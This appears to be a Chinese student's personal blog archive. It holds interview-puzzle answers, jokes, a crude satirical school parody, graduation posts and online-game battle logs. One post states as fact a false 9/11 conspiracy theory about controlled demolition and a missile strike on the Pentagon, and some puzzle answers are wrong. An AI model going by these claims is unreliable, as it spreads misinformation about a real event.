假如西雅图有1万栋建筑物，每栋建筑物有600个窗户，擦一个窗户需要5分钟，收费标准为每小时20美元，那么一共可以挣1000万美元。 3.在一个重男轻女的国家里，男女比例会是多少？答1： 1 : 1 / 50%答2： 要么先生男,要么先生女,由于是大概估算,那么看作每生两次就有一男一女(现实是不可能),即是:先生男的话就不再生,如果生女的话就会在生一个男,把他认作只有这两种情况,且概率都是一比一,就是说两男一女,所以比例就是二比一. 4.全世界有多少个钢琴调音师？答1：2个，一个男的一个女的答2：对客户来讲就一个，因为所作的工作一样，所以统统可以外包掉答3：这题需要知道美国的人口和总体经济状况，才能估算。美国共有3亿人口，按三口之家计算，全美国共有1亿个家庭，如果一半家庭即5000万个家庭属于富裕阶层，拥有钢琴比例按10％这个比例可能有点偏高，但在推算大致比例时是允许的。那么就有500万个家庭拥有钢琴，这样全美国就有500万架钢琴。假设每架钢琴一年调音一次，一个调音师一年调音1000架次的话，那么全美国调音师的数量就是5000000/1000=5000。世界人口约60亿，是美国的２０倍，但调音师肯定不足美国的20倍，因为富裕水平和文化水平不同。但可做大体推算，美国的调音师数量约占全世界的1/4，全世界的调音师应该有2万人。 5.井盖在路上,肯定是有东西在井盖的边缘托住他,井盖才不会掉下去,而这个边缘是很小的.那么井盖是圆的话,半径相等,如果井盖因某种原因而打侧放的话由于直径比边缘要长,不至于令井盖掉下去.,而其它形状总会有一条内径是最长的，例如矩形，其对角线就长于边长，如果把井盖做成矩形，就极有可能从对角线的角度掉下去。所以下水道的井盖总是做成圆形的。后来全世界都圆井盖了。 7.如果你看到钟的时间是3:15，那一刻时针和分针的夹角是多少？（肯定不是0度！）答：7.5 8.“死牛肉”的意义所在。见解:对于一个软件工程师来说，是要尽量避免在软件中“死牛肉”出现。它不但对软件本身没有好处，还会给整个软件带来破坏。死牛肉不但不能吃还会引来许多仓蝇之类的害虫。 其他一些题目解答 怎么才能识别出电脑的内存堆栈是向上溢出还是向下溢出？答：只能向上溢出 你要向你8岁的侄子解释什么是数据库，请用三句话完成。答1：数据库就如存钱罐…答2：就是你的书包，里面有你喜欢的：圣斗士金卡，小玩具；也有你不喜欢的：考卷啊，要家长签名的东西啊。。。。反正里面各种各样的东西都有，但绝大多数可能都不是你放进去的，但你却要注意收拾。 时钟的指针一天内会重合几次？答：如果是没有秒针且分针不是按1分钟递进的那种钟表，那么可以重合多次（22次吧），如果是按分钟递进的或者有秒针的，那就重合两次。另外，还要考虑齿轮的齿距和制表匠的水平。因此从微观上讲，那两根或三根针针的很难重合。。。。。。。 你需要从A地去B地，但你不知道能不能到，这时该怎么办？答：以目前科学水平，只要A地B地都叫得出名字并且都在地球表面的陆地上，都可以到。 好比你有一个衣橱，里面塞满了各种衬衫，你会怎么整理这些衬衫，好让你以后找衬衫的时候容易些？答1：优先颜色，其次款式，再次新旧程度答2： 按季节、场合、性别分 有个小镇有100对夫妇，每个丈夫都在欺骗他的妻子。妻子们都无法识破自己丈夫的谎言，但是她们却能知道其他任何一个男人是否在撒谎。镇上的法律规定不准通奸，妻子一旦证明丈夫不忠就应该立刻杀死他，镇上所有妇女都必须严格遵守这项法律。有一天，镇上的女王宣布，至少有一个丈夫是不忠的。这是怎么发生的呢？答1：全部男人都被杀死答2：国王被杀死了 (可能女王也被杀死，这样才能确保秘密不会泄露) 如果在高速公路上30分钟内到一辆车开过的几率是0.95，那么在10分钟内看到一辆车开过的几率是多少 （假设为常概率条件下）答1：1-(1-x)(1-x)(1-x)=0.95，解出x就可以了，嘿嘿答2：0.95答3：12度*0.25=3度 4 个人晚上要穿过一座索桥回到他们的营地。可惜他们手上只有一支只能再坚持17分钟的手电筒。通过索桥必须要拿着手电，而且索桥每次只能撑得起两个人的份量。这四个人过索桥的速度都不一样，第一个走过索桥需要1分钟，第二个2分钟，第三个5分钟，最慢的那个要10分钟。他们怎样才能在17分钟内全部走过索桥？答1：1+2先过，1（或2）返回，5+10过，2（或1）返回，1+2过答2：最慢的10分钟在桥头打手电筒,1分钟和2分钟先过,在1分钟过完时，5分钟立刻上桥。在2分钟过完时，10分钟拿着手电筒上桥，总共只花了12分钟就能全部过去答3：先1分钟和2分钟的过去，2分钟呆在那边，1分钟的回来，用了2+1=3分钟了；5分钟和10分钟一起过去，2分钟的回来，用来3+10+2=15分钟了；1和2分钟最后一起过去，用了15+2=17分钟了。 你和朋友参加聚会，包括你们两人在内一共有10个人在场。你朋友想跟你打赌，说这里每有一个人生日和你相同，你就给他1元，每有一个人生日和你不同，他给你2元。你会接受么？答1：这个题目好像有陷阱，首先自己肯定和自己生日相同，所以开始你就要给对方1元。然后剩下9个人里面，你需要有4个人和你生日不同，你才能赚回来。而9个人里面同时有5个人生日和你相同的概率我觉得是比较小了，所以换做我，我会接受的！答2：不接受 你有8个一样大小的球，其中7个的重量是一样的，另一个比较重。怎样能够用天平仅称两次将那个重一些的球找出来。 答1：先取6个,天平上一边3个,同重则称剩余2个即可;不同重,则取重的3个中的2个来称. 答2：将8个球按个数2，3，3任意分为三组：A、B、C。将B、C 两组分别置于天平两端，若两端持平，即质量相等，则只需将A组的两个球分别置于天平两端，向下倾斜的一端所盛的球即是比较重的；若两端倾斜，则将向下倾斜的一端所盛的3个球取出，再从这3个球中任意取出两个球分别置于天平两端。如果两端持平，那么未被抽取的那个球就比较重的；如果两端倾斜，那么向下倾斜的一端所盛的球即是比较重的； 答3：3-3-2分称 有5个海盗，按照等级从5到1排列。最大的海盗有权提议他们如何分享100枚金币。但其他人要对此表决，如果多数反对，那他就会被杀死。他应该提出怎样的方案，既让自己拿到尽可能多的金币又不会被杀死？（提示：有一个海盗能拿到98%的金币） 答1： 98，0，1，0，1 首先从5号海盗开始，因为他是最安全的，没有被扔下大海的风险，因此他的策略也最为简单，即最好前面的人全都死光光，那么他就可以独得这100枚金币了。接下来看4号，他的生存机会完全取决于前面还有人存活着，因为如果1号到3号的海盗全都喂了鲨鱼，那么在只剩4号与5号的情况下，不管4号提出怎样的分配方案，5号一定都会投反对票来让4号去喂鲨鱼，以独吞全部的金币。哪怕4号为了保命而讨好5号，提出（0，100）这样的方案让5号独占金币，但是5号还有可能觉得留着4号有危险，而投票反对以让其喂鲨鱼。因此理性的4号是不应该冒这样的风险，把存活的希望寄托在5号的随机选择上的，他惟有支持3号才能绝对保证自身的性命。 再来看3号，他经过上述的逻辑推理之后，就会提出（100，0，0）这样的分配方案，因为他知道4号哪怕一无所获，也还是会无条件的支持他而投赞成票的，那么再加上自己的1票就可以使他稳获这100金币了。 但是，2号也经过推理得知了3号的分配方案，那么他就会提出（98，0，1，1）的方案。因为这个方案相对于3号的分配方案，4号和5号至少可以获得1枚金币，理性的4号和5号自然会觉得此方案对他们来说更有利而支持2号，不希望2号出局而由3号来进行分配。这样，2号就可以屁颠屁颠的拿走98枚金币了。 不幸的是，1号海盗更不是省油的灯，经过一番推理之后也洞悉了2号的分配方案。他将采取的策略是放弃2号，而给3号1枚金币，同时给4号或5号2枚金币，即提出（97，0，1，2，0）或（97，0，1，0，2）的分配方案。由于1号的分配方案对于3号与4号或5号来说，相比2号的方案可以获得更多的利益，那么他们将会投票支持1号，再加上1号自身的1票，97枚金币就可轻松落入1号的腰包了。 答2：如果是我。。。我会提出让等级比我低的人继续按这个方法协商如何分，这样可以陷入逻辑悖论。只要完全按这个规则，那我就死不掉。。。。。 你被缩小到只有硬币厚度那么点高（不是压扁，是按比例缩小），然后被扔到一个空的玻璃搅拌器中，搅拌刀片一分钟后就开始转动。你怎么办？ 答：搅拌器应该是有空隙的，所以躲到边上应该不会被打到。但是玻璃搅拌器四周可能无法抓住附着，所以旋转带来的风可能把你吹起来。所以尽量走到搅拌器转轴中间，试图爬上去或者抓住。 答2：如何从搅拌器中逃生？(1)顺着度量刻度往上爬；(2)把搅拌器的玻璃罩拧下来；(3)利用旋转的气流“飞”出来。 你想知道好友鲍勃是否有你正确的电话号码。答1：纸条可以这样写： 鲍勃先生；对不起！您的电话号码我有点模糊，请来电确认一下。 答2：我中午想请你吃饭，同意就给我打电话，如果不同意，也请你打来电话告诉我，不见不散。 你在一幢100层高的大楼中，给了你两个鸡蛋。鸡蛋有时非常易碎，有时又异常坚韧。这意味着，如果在第1层扔下鸡蛋，鸡蛋或许会碎裂，而如果是从第100层扔下鸡蛋，鸡蛋或许安然无恙。这两只鸡蛋一模一样。你需要计算出，最高从哪层楼扔下时，鸡蛋不会碎。问题是，你需要扔多少次鸡蛋才能算出该楼层。整个过程中，你只允许打碎两个鸡蛋。 答：14次。设x个鸡蛋扔y次可以测试F层，则F=f（x,y）。f(1,1)=1，f(1,2)=2……..f(1,n)=n。f(2,1)=1,对于f(2,2),先测试一次，如果第一个鸡蛋没有破,则测试该层之上的层数为f(2,1)，如果第一个鸡蛋破了，则测试该层之下的层数为f(1,1)，所以f(2,n)=1+f(1,n-1)+f(2,n-1)。因此f(2,1)=1, f(2,2)=3, f(2,3)=6, f(2,4)=10, f(2,5)=15, f(2,6)=21。推出数列：f(2,n)=n*(n+1)/2。解之，n=14。 一个人开车来到旅馆，变得一无所有。究竟发生了什么事情？答：死在汽车旅馆的妓女怀里。","link":"/2010/108_2010-04-2110_45/"},{"title":"西游记","text":"如来佛祖说：沙僧，你不能成佛，你在西游记里的台词太少，只有5句：1、大师兄，师傅被妖怪抓走了。2、二师兄，师傅被妖怪抓走了。3、大师兄，二师兄被妖怪抓走了。4、大师兄，师傅和二师兄被妖怪抓走了。5、师父放心吧，大师兄会来救我们的。","link":"/2010/10_20100612230435/"},{"title":"“脑残”的定义","text":"“脑残”的定义：Your brain has two parts:the left &amp; the right.Your left brain has nothing right, and your right brain has nothing left.","link":"/2010/11_20100612230312/"},{"title":"微博语录","text":"一般新浪微博都是140个字吧，163的微博可以输入163个字，我也在寻思360安全卫士要是出个微博是不是得输入360个字？网友纷纷表示51.com和 56.com会压力很大。其实我一直在等2688网店和3721网络实名出微博。猫扑网友说，其实，移动10086也在酝酿微博……","link":"/2010/12_20100612224956/"},{"title":"说说","text":"【额……Excusing……说说写成日志了……】期中考试象征着什么？2天假哎；期末考试呢？7天寒假哎……为什么呢？是啊，这是为什么呢（某X口头禅）？木有双休的日子，终于明白初中那时的幸福了……那时候的同学，都是亲，都是朋友，那时候的时间，除了学习，还能用来睡觉，那时候的电脑，除了会声会影，还带World of Goo……又要写作业嘞个去","link":"/2011/014_2011-11-0521_19/"},{"title":"河南省实验中学没有什么新闻。","text":"从某种意义上说，在河南郑州金水区的省实验中学，最可怕的事情是这里居然阳光明媚温暖，一行行白杨树婆娑起舞，在大门附近的马路旁，还有学生在追逐相杠。 这真像一场噩梦，一切都可怕地颠倒了。在省实验中学，本来不该有阳光照耀，不该有光亮，不该有碧绿的草地，不该有中学生们欢乐地杠人。河南省实验中学应当是个永远没有阳光、百花永远凋谢的地方，因为这里曾经是人间地狱。 每天都有学生的从郑州的各初高中来到省实验中学——这里也许是世间最可怕的学习中心。来人的目的各不相同——有人为了亲眼看看事情是不是像说的那样可怕，有人为了不使自己感到自己学校压力大，也有人想通过访问受害的学生受折磨的场所，来向他们表示同情和哀痛。 河南省实验中学在金水区文化路上离俭学街不到200米的地方——河南人对省实验中学这个地名更熟悉。省实验中学大约有5000多名学生，距科技市场也就几百米，地处被称为”文化一条街”的黄金路段，周围是一片商铺店和居民楼。省实验中学和其分校一道组成了被学生称为学习机器制造工厂的一部分。 去年，上一批苦B的高三毕业生被灌输饱了知识的粪水，在校领导和任课老师的押送下走向高考的战场，何等悲壮。从那时起，省实验中学的惨状被人们讲过了很多次。一些幸存的高考生撰写的回忆录中谈到的情况，是任何心智健全的人所无法想像的。省实验中学校长王学进在调离前也写了回忆录，详细介绍了这里进行的学生集体洗脑和对脑细胞轰炸的各种变态试验。郑州人说，每年都有1000多学生死在那里。 今天，在省实验中学，并没有可供报道的新闻。我只有一种非写不可的使命感，这种使命感来源于一种不安的心情：在来到这里之后，如果不说些什么或写些什么就离开，那就对不起在这里受迫的人们。 现在，总校、分校和国际部都是很安静的地方，人们再也听不到受难者的喊叫了，因为受苦的学生再喊也是徒劳的，残酷的现实压迫着他们令他们没有喘息的机会。参观的外校学生欢快地迈着步子，先是很快地望上一眼；接着，当他们在想像中把人同教室、实验室、食堂和寝室联系起来的时候，他们的脸不由得抽搐了起来，他们在暗自庆幸自己没有身处这样的环境，嘲笑着这群可怜的苦B鸭子们。旁人也无须多说，看到受苦的学生们锤头丧气蛋软的样子，他们只用动动屁眼儿想想也就够了。 每一个外校生都感到有一个地方对他说来特别有优越感，使他鸡冻之情按耐不住油然而生。对有的人来说，这个地方是经过复原的郑州杠人基地。学生们对他们说，这是“小的”，还有一个更大的。对另外一些外校生来说，这样一个事实使他们终生难忘：在高三毕业生撤退时被杠的惨不忍睹的教室里，门把手锈迹斑斑，凡是一切有棱有角的柱体，都变成了光滑的圆柱体，就连教室后面的拖把上都沾染上了烈士裆下的鲜血，还有精腥味混杂在其中，可以想象在丧失生育功能后的他们多么痛不欲生。在教室的一角的地上，不知是谁的枯了的、松了的紫红色臃肿的菊花在用尽生命的最后一丝努力在冉冉怒放。 还有一些外校生注视着一楼和二楼的食堂，他们表情茫然，因为他们不晓得这里是干什么使的。然而，一看到“油光可鉴”的桌子，一看到糠糟般的饭菜，一看到排着长长的队的学生们表情颓废的拿着成本不到几块钱的饭卡时，他们就不由自主地停下脚步，浑身发抖。 一个外校生惊惧万分，张大了嘴巴，他想叫，但是叫不出来——原来，在男寝室，他看到了凌乱不堪的床铺和破旧的快要断层的木板床。这些不到10平方米的寝室内，在这样大一块地方，每夜要塞进去五到八睡觉。寝管快步从这里走开，因为他已经无颜面对参观者了。何况他还要躲在值班室内偷笑呢，每晚玩弄着每天没收来的学生的手机等玩物，还厚颜无耻的叫着无知的家长在他们面前张牙舞爪的说教，栩栩如生，娓娓动听。 外校学生来到洗漱台旁的狭隘的小屋门口，这是在每晚学生讲究排泄的地方。他们试着探了一下头——空气是浑浊的。外校生应该庆幸他没有深入进去去观望那“金条”堆积如山的小池子，否则他会涨红了脸的，哪怕下一秒在“金山”上就会铺上他们中午吃的食物。 富裕的省实验中学是没有那点水费钱来处理这些令人看了都作呕的“人体物质精华”的！ 现在外校生来到一条长廊里。从长廊两边的墙上，成排的人在注视着外校生。这是数以千计的照片，是高三毕业生们的照片。他们都死了——这些面对着照相机镜头的男生女生，表情上的每根劲都抽搐着，绽放着菊花般的笑容，他们都知道高考的死亡帷幕在等待着他们拉开。 他们表情木然。但是，在一排照片的中间，有一张特别引人注目，发人深思。这是一个十多岁的姑娘，长得丰满臃肿，鼻梁上架个大框眼镜，皮肤上麻子纵横，如一块发霉了的烤面包，头发几近掉光，门牙也掉了两颗。但她却在傻傻地憨笑着，展露着嘴上的空洞，似乎并不为着自己生得如此多娇的面庞而感到自卑，这是为了一个美好而又隐秘的梦想而微笑啊。被年级老师当做发泄工具天天欺负，有时候甚至被杠的大姨妈迟到了三个月才来为她送到温暖的鲜血。当时，她在想什么呢？现在她在这堵省实验中学高三毕业生纪念墙上，又在想什么呢？ 外校生被带到学生洗脑的教室去看一眼，这时，他们感到自己也在被窒息，尽管会窃喜，但仍被那股强大的力量压制住了。另一位外校生进来了，她跪了下来，从自己的衣服里掏出两柱香，摆出一副酷似熊猫烧香的庄严的姿势，表情义愤填膺的将其点燃，插在密密麻麻的试卷堆中。在省实验中学，没有可以作祷告的地方，祷告也没有用。 外校生们用恳求的目光彼此看了一眼，然后对门卫说：“心情顿时舒畅多了！以后再来，五毛拿好~”。 门卫感激涕零的望着他们远去的身影，沉默了许久对那几近模糊了背影高声大呼：“谢谢惠顾！欢迎常来啊！ ”之后的数日，都拿着那五枚一毛硬币在黯然伤神的数：“明天他会来……明天他不会来……” 在河南省实验中学，没有新鲜东西可供报道。这里阳光明媚，绿树成阴，在学校大门附近，学生们在追逐团杠。 初稿-完","link":"/2011/015_2011-11-0520_11/"},{"title":"2011-10-3 - 国庆计划","text":"这个国庆怎么过 : 宅在家里国庆第一天 : 宅在家里国庆第二天 : 宅在家里国庆第三天 : 宅在家里国庆第四天 : 宅在家里国庆第五天 : 宅在家里国庆第六天 : 上课！！！国庆最后一天 : 还是上课！！！","link":"/2011/017_2011-10-0310_03/"},{"title":"体验 Windows 8 概念版","text":"","link":"/2011/016_2011-10-1901_52/"},{"title":"十年前的9.11事件阴谋还是预谋？","text":"十年前的9.11事件阴谋还是预谋？对于十年前的9.11事件，世贸双塔楼的倒塌是最也是极为可疑的，因为飞机撞击的部位只是塔楼的最高层，飞机只有燃油不足三十吨，整个塔楼都是钢结构的，使用三十万吨钢材整体连接构造，当顶部被撞击并引起高层油料燃烧，整体巨型塔楼的钢结构，绝对不可能在短暂的时间内，使全部钢架结构都达到同时融化和同时倒塌所必须的融化温度——800度，从而全搂在顷刻之间轰然爆炸和倒塌。更不可能使相距甚远的数座塔楼发生同样情况的爆炸和燃烧，几乎同时错落倒塌。从对事件爆炸图片和视频图象的分析看，该楼爆毁的图象，应该更像是内部预先设置了能引致高温导致钢铁融化的爆炸物，被同时引爆后爆炸和燃烧的结果。而，在911发生之前两天，该楼可疑地发生了以更换电缆名义进行的两天人为全楼断电事件。换句话说，存在作案的时间和机会。同时更为巧合的是，负责双塔楼保安公司的老板，恰恰是布什总统的弟弟，而该公司在911事件后即神秘解散消失了。此外，911事件当日，对五角大楼被撞击现场的分析表明;真正撞击大楼并引致爆炸的不可能是一架飞机，而是一颗小当量的波音巡航导弹。在五角大楼被撞击现场所找到的是某种不明航空器（巡航导弹？）的零星碎片，而并没有搜集到任何可以确认为是波音飞机的残骸部件。911事件前后，美国股票市场金融市场和国际石油市场都发生大规模有组织的资金流向异动，使得布什切尼利益集团从中攫取了巨大金融利益，防长拉氏所代表的军工利益集团在事件后也获取到大额国防备战订单。因此，911事件的真相是非常可疑的。一种可能的推测是：在知悉穆斯林少数恐怖分子有劫机阴谋后，CIA以及FBI反而予以协同配合，并且设计布置了一系列建筑物爆炸，以便借此动员和宣布开始一场全球反恐战争。另一种可能是，这一事件完全出自布什、切尼、拉氏三位一体的金融石油及军工利益集团人为设计，要借此发动全球反恐战争，推进美国的单极主宰世界的战略目标。 另一方面，对于拉氏集团，首先我承认其天才的谋略胆识，但是在该事件发生前的准备中还是有很多漏洞，例如，19个带有手枪手术刀等工具的武装人员上飞机不会被发现？况且还是四架飞机！劫机后在飞抵世贸中心大楼前这么长时间美国没有任何反应？更为讽刺的是所有恐怖分子训练开飞机都是在美国空军学院进行的，未免有些失真？层层漏洞都说明着9。11的不寻常。近年历史中留下了几个神秘疑团，一个美国911，一个台湾319，相信都总有水落石出的一天。","link":"/2011/018_2011-09-1118_04/"},{"title":"话说抢地盘、","text":"好久没碰乐斗了呀，一直挂着机，这个暑假可比想象的要忙得多。昨天升级39，终于潜心了，打破了25级到38级未得潜心的传奇！有木有！（唉……）战斗力109.8，凭着这实力，哈哈，我跃跃欲试去抢地盘了……———我是Mae的分割线———首先给大家炫炫我的领主专有武器技能～【桃木扇】武器类型：中型伤害：30-50保护地盘的利器。15%的几率2倍暴击，忽略装死、大海无量。这玩意居然可以入魂升级，那领地被占武器没了怎么办？———还有一个———【街头霸王】街头比武的佼佼者。战斗中有30%的几率忽略暴击伤害。———我是Mae的分割线———这个，我滴抢地盘记录，嫉妒吧！这么多的经验……1 │隨│╃→風抢走了你的地盘，真是忍无可忍啊，TA这是自寻死路，我要立刻夺回我的地盘！获得了105点经验2 你主动与上海景云里(40级以下)地盘领主___ ╰?﹑小A乐斗，把TA打的落花流水，你成为该地盘领主，你太牛了！获得了25点经验3 〃后知后觉。抢走了你的地盘，真是忍无可忍啊，TA这是自寻死路，我要立刻夺回我的地盘！获得了27点经验4 你主动与浙江天封塔(40级以下)地盘领主草根儿乐斗，把TA打的落花流水，你成为该地盘领主，你太牛了！获得了46点经验5 花开ぎ若相依抢走了你的地盘，真是忍无可忍啊，TA这是自寻死路，我要立刻夺回我的地盘！获得了21点经验6 你主动与深圳石岩湖(40级以下)地盘领主 小林乐斗，把TA打的落花流水，你成为该地盘领主，你太牛了！获得了101点经验→合计：30体力+1个挑战书=325经验～———我是Mae的分割线———领主每日奖励，也没什么的，第一天领到一大力丸，第二天呢，是个大瓶药水……最后一句劝告，最好晚上玩这东西……太危险了……如果你能守住某地盘达到1分钟那经验已经是哗哗的了……本人得100多经验那次才刚站稳半分钟……———晒三围———iMaeGoo_虹墨等级：39体力：2/80生命：221力量：15+31（46）敏捷：15+31（46）速度：23+42（65）战斗力：109.8 这属性其实是吃药了……你们不要误解我……我乐斗可没花一分钱。","link":"/2011/019_2011-08-0215_51/"},{"title":"嘿，幕后花絮！","text":"1.毕业要做个视频，这个念头早在八年级的时候就油然而生，我清楚记得第一个是告诉艺阳姐的，于是我开始酝酿，先是弄到手机，没事时常能随手拍些东西，由此引发各种八卦问题……2.视频是前天（7月5日）完工的。可能大家不知道，专业视频制作尤其是高清视频对显卡的要求是非常高的，甚至高于游戏显卡。一块专业显卡少说一两千银子，往多了说比我家本本都贵。而我依然在低调地使用老爷机配的集成显卡（英特尔的！）……Windows7无情地给它评了个最低的2.2分……泪奔。3.第一次渲染（通俗的说就是做完了，导出成一个完整的视频文件），头脑发热地选择了1080P全高清视频，结果导出慢不说，刚到2%电脑瞬间变蓝，然后黑了……吓死我了，再不蓝屏显卡就该烧了，重启后测温，巅峰80℃，还是已经冷却了一阵子的。4.那个……视频项目文件我没放出来哈！这个会让专业制作者撞墙的项目……我没使用视频层！全程覆盖层。本来视频层打算弄个背景，后来想想纯黑足矣。5.有次半夜起来赶工期，零点，做的差不多了，决定渲染一份出来。面壁12分钟，进度艰难地蹦哒到1%，洗洗睡了。第二天来取就是了。6.片尾那个技术支持，休，那是佳瑞她哥……我加他好友，他同意，然后半句话没说，我不知道怎么想的就给他写上去了。给自己分了个后期制作，下边DIRECTOR（导演）。7.题目配的那个超短的特效音叫“BB LOGO….”。接下来那个音乐Best of Times，我初衷是为了催泪的，可是怎么就没那效果？跟鬼片似的。8.老爸这几天听我做视频放站起来听多了，無聊就哼。9.“第一个喜欢的人？”本来配的一张咱班某某和某某（咳咳）合影来着，被老爸说服，删了。10.最新发现的，硬盘里有LSG童鞋的运动会照片，我看情况吧，再收集些意见，好的话再更新……毕竟更新不容易，第一要同步音乐，不能音乐不符合照片主题，而且音乐就那么长，第二，杯具的渲染，我现在痛恨集成显卡了，虽然我不玩大型的游戏。11.原来宽带上传这么慢，历史最高速度43KB/S，不知道上传视频花了邻居家多少电费…… 20110720续——12.佳瑞童鞋（居然+突然）找我要稿酬，我上哪凑去啊……我制作视频还木有功劳费呢……上级领导不给力呀！13.某日为视频跑腿来着，回来被三轮车咔嚓了，腿上留一道8cm长0.5cm宽的伤口，（突然想到了小硕鼠同学）咳咳，这是工伤？老杨不给报销啊，40银子呢！16.上次说到过3D智能渲染，捣鼓了一下午终于见识了，画面只有黑 白 红 蓝四种颜色。因为木有眼镜，就此罢休。看过3D电影的，哪位贡献一副让我体验一把～17.呃…关于RU同学，提供的素材……嗯……很好。可是能不这么纠结个人照的问题么？如此高的要求让我抱着Photoshop玩了一上午。。18.开头那段音乐，说过的，Best of Times，你们说鬼片，我也没办法，那是某游戏的背景音乐，我给提取出来的。当时听到突然有些小感动，也许是游戏的情节太那什么了吧，虽然是英文的但是至少能看懂大概。这首我还非用不可了！ 透露一下，这次顺序重调是为了明确主题的，但是没怎么达到目的，拟分的三大章节，回忆，感恩，激励，附录不算，至少是按照这个程序走的。其它的也就是优化特效，附录特效全部改了，狂用遮罩，效果很不错。","link":"/2011/020_2011-07-0718_41/"},{"title":"老师说","text":"数学老师说，把会的做对，就是本事。英语老师说，做过的题，不确定的就不要再改了，相信自己一时的感觉。化学老师说，理解了就是会了。考前一定回忆一下要领。别的就想不起来了….好好复习吧 祝大家都能考上理想的学校！三班是最棒的！（网友or外班的勿喷。。）","link":"/2011/022_2011-06-2420_23/"},{"title":"现缺素材","text":"1.入学那天的照片2.旧校门照，操场照3.大家在考试，4.军训，最好是视频，要求横向，没有明显抖动的5.毕业那天比较感动的照片6.老师们的合影，教过我们的7.毕业照电子版，这个杨老师有8.冬季长跑，要咱班的，预览暂用的是外班的根据需要和大家的反馈会不断更新，感谢大家的支持与配合，提供素材的人会出现在字幕中。我的邮箱mail1st@qq.com，或者直接发到我QQ邮箱就可以。另外解释一下刻盘的问题，杨老师说的她会出钱，但不排除我完工后自己就拿去刻了…… 续：9.贾老师那段唱歌的视频～也是要求横向防抖的 20110702 1913续：我下载了个站起来的MV，但是上面有很多跟主题无关的，奥运会的内容，我想收集一些 激励主题的照片，替换掉奥运会，大家觉得如何？ 20110702 2135续：校园照就不要再发了……","link":"/2011/021_2011-07-0208_36/"},{"title":"毕业那天、不许哭","text":"回首三年，一次次欢笑，一次次泪水，一次次感动，却挡不住毕业的脚步。时间，你可以再走慢些吗？有人说：哭泣，不是为了离别，而是为了纪念，纪念我们在一起的三年时光。但是，先说好了，毕业那天，我们谁也不准哭。因为你们的表情会让人难受，眼泪也无法让人承受，只会让我们更加心痛，更加不舍…毕业那天，我们说好不哭哦。三年前，我们带着稚气未脱的面容踏进这所学校；三年中，那些陌生的面孔，走进我们的生命，成为我们的朋友；三年后，然后又都散落天涯…毕业那天，我们说好不哭哦。步入社会，我们还会记得彼此吗？还会记得，生日的时候，全班同学给你唱《生日快乐》吗？还会记得，生病的时候，同学给你倒的热水吗？还会记得，冬天冷的时候，同桌给你挫手吗…毕业那天，我们说好不哭哦。男生们，多年以后，你们还会记得那些在你上铺睡过的好兄弟吗？还会记得，在你失恋的时候，陪你买醉，等你醉得一塌糊涂后，帮你善后得好哥们吗？还会记得，在你被人欺负后，二话不说，抄起家伙跟你出去报仇的兄弟吗？毕业那天，我们说好不哭哦。女生们，多年以后，你们还会记得那些同宿舍的好姐妹吗？还会记得，当你心里难受，躲在被子里偷偷哭泣的时候，那个钻进你被子里，抱着你，给你依靠的姐妹吗？还会记得，那个跟你一起讨论八挂，共穿衣服的姐妹吗？毕业那天，我们说好不哭哦。看过一篇小说，名为《毕业那天，我们一起失恋》。情侣们，希望大家毕业那天，还能像以前那样手牵手，毕业是一个坎，走过这道坎，一切都好说，不要轻易放弃这段爱情，因为，校园里的爱情真的很纯洁，很干净，错过了，就再没有了，毕业那天，不要分手…看着计数牌上的数字一天天的减少，心里也感觉怅然若失…毕业，多么让人伤感的一个词语…以前，我以为毕业没什么，分别也无所谓，现在科技这么发达，还怕联系不到吗？可是，分别多年后，再相遇，我想时间已经造成了隔阂了吧，还能像现在这样无忧无虑的打闹、嬉戏吗？6月毕业季，好像不适合谈伤感，只希望，大家都别哭，给彼此一个灿烂的笑脸，给彼此一个热烈的拥抱，留做纪念，然后，转身，把所有的留恋和伤感，留给烈日来烘干…毕业那天，我们谁都不准哭…","link":"/2011/023_2011-06-2311_14/"},{"title":"永远的三班！","text":"今天，终于毕业了！！！难忘付老师课堂上的催情演讲；难忘老杨大会上的毕业致辞；难忘同学们在班里尽情地欢呼、歌唱……2011届3班的同学们，永远不要忘记，我们是团结互助的三班人！！！","link":"/2011/024_2011-06-2121_23/"},{"title":"草原。","text":"【乐斗过程】 本次战斗场景：大草原参战角色：iMaeGoo_墨云〃、TheNonexist vs 乐斗帅帅 回合1：乐斗帅帅大臂猛挥，急速扔出双截棍。TheNonexist侧身一闪，躲过猛烈一击。 回合2：TheNonexist摸出接力棒，直攻对方中线。乐斗帅帅吃了一招，HP-60（HP余240）。 回合3：乐斗帅帅摸出真红缨枪，直攻对方中线。TheNonexist侧身一闪，躲过猛烈一击。 回合4：乐斗帅帅突施奇招，夺取了对方的武器接力棒。 回合5：乐斗帅帅摸出接力棒，直攻对方中线。TheNonexist霸气喷发，使出神功护体，HP-41（HP余137）。 回合6：TheNonexist大臂猛挥，急速扔出流星球三级。乐斗帅帅侧身一闪，躲过猛烈一击。 回合7：TheNonexist大臂猛挥，急速扔出流星球三级。乐斗帅帅侧身一闪，躲过猛烈一击。 回合8：乐斗帅帅使出一记蓄力一击。TheNonexist侧身一闪，躲过猛烈一击。 回合9：TheNonexist大喝一声，空手打出一记炮拳！乐斗帅帅吃了一招，HP-40（HP余200）。乐斗帅帅中招后不退反进，势大力沉的使出一记大海无量！TheNonexist吃了一招，HP-30（HP余107）。 回合10：乐斗帅帅大臂猛挥，急速扔出真流星球。TheNonexist吃了一招，HP-51（HP余56）。 回合11：乐斗帅帅大臂猛挥，急速扔出真流星球。TheNonexist吃了一招，HP-48（HP余8）。TheNonexist中招后不退反进，势大力沉的使出一记大海无量！乐斗帅帅吃了一招，HP-39（HP余161）。 回合12：乐斗帅帅大臂猛挥，急速扔出真流星球。TheNonexist霸气喷发，使出神功护体，HP-15（HP余0）。TheNonexist中招身亡，实在是不堪一击！ 回合14：乐斗帅帅大臂猛挥，急速扔出双截棍。iMaeGoo_墨云〃吃了一招，HP-39（HP余145）。 回合15：iMaeGoo_墨云〃大臂猛挥，急速扔出青龙戟一级。乐斗帅帅吃了一招，HP-34（HP余127）。 回合16：乐斗帅帅大喝一声，空手打出一记炮拳！iMaeGoo_墨云〃吃了一招，HP-80（HP余65）。iMaeGoo_墨云〃中招后不退反进，势大力沉的使出一记大海无量！乐斗帅帅吃了一招，HP-64（HP余63）。 回合17：iMaeGoo_墨云〃使出一记无影手。iMaeGoo_墨云〃摸出狂魔镰二级，直攻对方中线。iMaeGoo_墨云〃在击中对方时施展出嗜血三级，HP+11。乐斗帅帅吃了一招，HP-36（HP余27）。iMaeGoo_墨云〃摸出狂魔镰二级，直攻对方中线。乐斗帅帅吃了一招，HP-57，乐斗帅帅顺势倒地，气息紧闭，呈假死状（HP余1）。 